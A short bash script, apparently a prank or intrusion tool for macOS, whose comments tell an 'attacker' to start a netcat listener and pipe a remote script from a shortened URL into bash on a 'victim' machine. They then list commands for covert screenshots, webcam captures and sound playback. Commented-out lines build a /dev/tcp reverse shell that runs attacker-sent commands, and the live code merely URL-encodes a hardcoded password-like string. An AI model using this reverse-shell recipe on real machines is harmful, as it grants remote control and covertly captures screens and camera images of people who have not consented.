#!/usr/bin/env bash
# run `nc -nvl 80` on attacker machine first
# run `curl -Ls https://git.io/vXd2N | bash -s <attacker-ip> 80` on victim machine

# great commands to run:
# * curl http://discovermagazine.com/~/media/import/images/b/e/b/chimpmedia.jpg -o /tmp/monkey.jpg
#   open /tmp/monkey.jpg
# * say hello
# * open http://lmgtfy.com/?q=how+to+lock+mac
# * ls
# * screencapture -x /tmp/screenshot.jpg
#   open /tmp/screenshot.jpg
# * brew install imagesnap
#   imagesnap /tmp/selfie.png
#   open /tmp/selfie.png
# * curl http://soundbible.com/grab.php?id=1542&type=mp3 -o /tmp/airhorn.mp3
#   afplay /tmp/airhorn.mp3

# attacker_ip=xxxx
# attacker_port=8089

# exec 5<>/dev/tcp/$attacker_ip/$attacker_port
# cat <&5 | while read line; do $line 2>&5 >&5; done

urlencode() {
    # urlencode <string>

    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:$i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf '%s' "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LC_COLLATE=$old_lc_collate
}

# urlencode "abc="
password="PQ+EeD885UIg3m+BPZjKrNDmd4Zu5jj"

password_en=$(urlencode ${password})
echo ${password_en}